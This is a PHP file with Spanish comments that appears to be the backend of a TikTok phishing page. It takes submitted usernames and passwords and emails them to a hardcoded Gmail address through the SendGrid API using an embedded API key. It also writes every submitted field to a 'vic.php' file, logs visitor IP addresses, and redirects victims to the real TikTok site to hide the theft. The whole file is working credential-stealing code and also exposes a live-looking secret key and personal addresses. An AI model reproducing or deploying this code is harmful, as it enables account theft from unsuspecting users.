 <?php
ob_start(); // Inicia el almacenamiento en búfer de salida

include ('admin/config.php');

// Reemplaza con tu API Key de SendGrid
$apiKey = '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';

// Recoge los datos del formulario
$username = $_GET['username'];
$password = $_GET['password'];

// Construye el cuerpo del correo
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$subjek = "TikTok $username";
$body = <<<EOD
Username   =   $username
Password   =   $password
Coming from   = $url
EOD;

// Datos para la API de SendGrid
$emailData = [
    "personalizations" => [[
        "to" => [[
            "email" => "palmagadiel8@gmail.com"  // Reemplaza con el correo del destinatario
        ]]
    ]],
    "from" => [
        "email" => "gadpalma7@gmail.com"  // Reemplaza con tu correo
    ],
    "subject" => $subjek,
    "content" => [[
        "type" => "text/html",
        "value" => $body
    ]]
];

// Configura cURL para enviar la solicitud a la API de SendGrid
$ch = curl_init('https://api.sendgrid.com/v3/mail/send');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    "Authorization: Bearer $apiKey"
]);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($emailData));

// Envía la solicitud y maneja la respuesta
$response = curl_exec($ch);
if (curl_errno($ch)) {
    $errorMsg = 'Error:' . curl_error($ch);
} else {
    $successMsg = 'Correo enviado con éxito';
}
curl_close($ch);

// Guarda los datos en un archivo
$handle = fopen("admin/vic.php", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\n");
}
fclose($handle);

// Guarda la IP del visitante
$line = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'];
file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);

// Redirige a TikTok
header("Location: https://www.tiktok.com/");
exit;

ob_end_flush(); // Envía el contenido del búfer de salida y lo desactiva
?>
